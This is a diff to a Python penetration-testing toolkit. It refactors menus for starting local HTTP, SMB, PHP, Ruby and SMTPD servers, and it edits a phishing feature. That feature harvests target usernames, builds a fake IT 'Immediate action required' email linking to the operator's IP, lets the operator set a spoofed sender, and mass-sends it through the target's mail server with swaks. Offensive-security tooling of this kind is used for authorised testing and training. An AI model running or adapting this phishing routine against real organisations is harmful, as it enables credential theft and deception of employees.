@@ -453,12 +453,7 @@ def fileCheck(variable):
             print("[+] Adding username Administrator to " + variable + "...")
             localCOM("echo 'Administrator' > " + variable)
             print("[+] Adding password Admin to " + variable + "...")
-            localCOM("echo 'Admin' > " + variable)            
-      if variable == dataDir + "/usernames.txt":
-         for x in range (0, maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)         
-         wipeTokens(VALD)
+            localCOM("echo 'Admin' > " + variable)
    else:
       print("[+] Checked file " + variable + ", the file contains data...")
    return
@@ -472,12 +467,13 @@ def dispBanner(variable,flash):
    localCOM("pyfiglet " + variable + " > banner.tmp")
    return
    
-def dispSubMenu1():
+def dispSubMenu(variable):
+   variable = spacePadding(variable,163)
    localCOM("clear")
    dispMenu()
    options()
    print('\u2554' + ('\u2550')*163 + '\u2557')
-   print('\u2551' + "(01) HTTP Server (02) SMB Server (03) PHP Server (04) RUBY Server" + (' ')*98+ '\u2551')
+   print('\u2551' + variable + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -1452,26 +1448,36 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection == '13':
-      dispSubMenu1()
+      dispSubMenu(" (01) HTTP Server (02) SMB Server (03) PHP Server (04) RUBY Server (05) SMTPD Server (6) Exit Menu")
       checkParams = 0
-      getChoice = input("[?] Please select an option: ")
-      getPortValie   = input("[?] Please select a port value: ")
-      if getChoice == "1":
-         choice = "python3 -m http.server --bind " + localIP + " " + getPortValue
-         checkParams = 1
-      if getChoice == "2":
+      subChoice = input("[?] Please select an option: ")
+      if subChoice == "1":
+         HTTP = input("[?] Please select a port value: ")
+         if HTTP.isnumeric():
+            choice = "python3 -m http.server --bind " + localIP + " " + HTTP
+            checkParams = 1
+      if subChoice == "2":
          choice = "impacket-smbserver " + httpDir + " ./" + httpDir + " -smb2support"
          checkParams = 1
-      if getChoice == "3":
-         choice = "php -S 0.0.0.0:" + getPortValue    
-         checkParams = 1
-      if getChoice == "4":
-         choice = "ruby -run -e httpd . -p " + getPortValue
-         checkParams = 1
-      if checkParams == 0:
-         print("[-] Sorry, I did not understand the value " + getChoice)
-      else:
-        if getPortValue != "":
+      if subChoice == "3":
+         HTTP = input("[?] Please select a port value: ")
+         if HTTP.isnumeric():
+            choice = "php -S " + localIP + ":" + HTTP    
+            checkParams = 1
+      if subChoice == "4":
+         HTTP = input("[?] Please select a port value: ")
+         if HTTP.isnumeric():
+            choice = "ruby -run -e httpd . -p " + HTTP
+            checkParams = 1
+      if subChoice == "5":
+         HTTP = input("[?] Please select a port value: ")
+         if HTTP.isnumeric():
+            choice = "python3  /usr/lib/python3.9/smtpd.py -n -c DebuggingServer " + localIP + ":" + HTTP
+            checkParams = 1
+      if subChoice == "6":
+         pass         
+      if checkParams != 0:
+        if HTTP != "":
             print(colored("[*] Specified local server started...", colour3))
             localCOM("xdotool key Ctrl+Shift+T")
             localCOM("xdotool key Alt+Shift+S; xdotool type 'LOCAL SERVER'; xdotool key Return")
@@ -3092,7 +3098,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='74':
-      checkParams = getPort()      
+      checkParams = getPort()
       if HTTP == 0:
          print("[-] You need to start the HTTP server first...")
          checkParams = 1               
@@ -3134,7 +3140,11 @@ while True:
          checkParams = getPort()                 
          if checkParams != 1:                     
             print(colored("[*] Checking for valid usernames...", colour3))
-            fileCheck(dataDir + "/usernames.txt")                        
+            fileCheck(dataDir + "/usernames.txt")
+            for x in range (0, maxUser):
+               USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
+               USER[x] = spacePadding(USER[x], COL3)         
+            wipeTokens(VALD)
             print(colored("[*] Attempting to connect to remote SMTP socket...", colour3))
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             try:
@@ -3193,7 +3203,7 @@ while True:
             print(colored(quitResponce, colour6)) 
             s.close()            
             if check != 1:
-               print(colored("\n[*] Creating a corporate looking phishing email...\n", colour3))
+               print(colored("\n[*] Creating a corporate looking phishing email...", colour3))
                localCOM('echo "Hello.\n" > body.tmp')
                localCOM('echo "We just performed maintenance on our servers." >> body.tmp') 
                localCOM('echo "Please verify if you can still access the login page:\n" >> body.tmp')
@@ -3201,8 +3211,11 @@ while True:
                localCOM('echo "\t  Citrix http://"' + localIP + ":" + checkParams + '"/" >> body.tmp')
                localCOM('echo "  <a href=\"http://"' + localIP + ":" + checkParams + '"\">click me.</a>" >> body.tmp')
                localCOM('echo "\nRegards," >> body.tmp')
-               localCOM('echo "it@"' + DOM.rstrip(" ") + '""  >> body.tmp')                           
-               print(colored("Subject: Immediate action required", colour6))  
+               sender = input("[?] Please enter senders name: ")
+               if sender == "":
+                  sender = "it"
+               localCOM('echo ' + sender + '@' + DOM.rstrip(" ") + ' >> body.tmp')
+               print(colored("\nSubject: Immediate action required", colour6))  
                catsFile("body.tmp")                      
                print(colored("[*] Starting phishing server...", colour3))            
                dispBanner("GONE PHISHING",0)               
@@ -3219,8 +3232,8 @@ while True:
                      phish = phish.strip(" ")
                      phish = phish + "@"
                      phish = phish + DOM.rstrip(" ")
-                     remotCOM("swaks --to " + phish + " --from it@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
-                     print("[+] Email exploit sent to " + phish + "...")                              
+                     remotCOM("swaks --to " + phish + " --from " + sender + "@" + DOM.rstrip(" ") + " --header 'Subject: Immediate action required' --server " + TIP.rstrip(" ") + " --port 25 --body @body.tmp > log.tmp")
+                     print("[+] Email exploit sent to " + phish + " from " + sender + "@" + DOM.rstrip(" ") + "...")
       prompt()      
       
 # ------------------------------------------------------------------------------------- 
@@ -3254,7 +3267,7 @@ while True:
 # -------------------------------------------------------------------------------------
 
    if selection =='78':
-      print("[!] (1) USER NAMES (2) PASS WORDS (3) NTLM HASHES (4) HOSTS CONFIG (5) RESOLV CONFIG (6) PROXYCHAINS CONFIG (7) KERB5 CONFIG")      
+      dispSubMenu(" (01) USER NAMES (02) PASS WORDS (03) NTLM HASHES (04) HOSTS CONFIG (05) RESOLV CONFIG (06) PROXYCHAINS CONFIG (07) KERB5 CONFIG (08) Exit Menu")
       checkParams = 0
       subChoice = input("[?] Please select the file you wish to edit: ")      
       if subChoice == "1":
@@ -3286,8 +3299,8 @@ while True:
       if subChoice == "7":
          localCOM("nano /etc/krb5.conf")
          checkParams = 1
-      if checkParams == 0:
-         print("[-] Sorry, I do not understand the value " + subChoice + "...")   
+      if subChoice == "8":
+         pass
       prompt()
       
 # ------------------------------------------------------------------------------------- 
@@ -3343,10 +3356,11 @@ while True:
          else:
             remotCOM("cewl --depth 5 --min_word_length 3 --email --with-numbers --write " + dataDir + "/usernames.txt " + TIP.rstrip(" ") + " 2>&1")
             print("[+] User list generated via ip address...")         
-         fileCheck(dataDir + "/usernames.txt")         
-         for x in range (0,maxUser):
-            USER[x] = linecache.getline(dataDir + "/usernames.txt", x+1).rstrip(" ")
-            USER[x] = spacePadding(USER[x], COL3)     
+         fileCheck(dataDir + "/usernames.txt")
+         for x in range (0, maxUser):
+            USER[x] = linecache.getline(dataDir + "/usernames.txt", x + 1).rstrip(" ")
+            USER[x] = spacePadding(USER[x], COL3)         
+         wipeTokens(VALD)         
       prompt() 
       
 # ------------------------------------------------------------------------------------- 
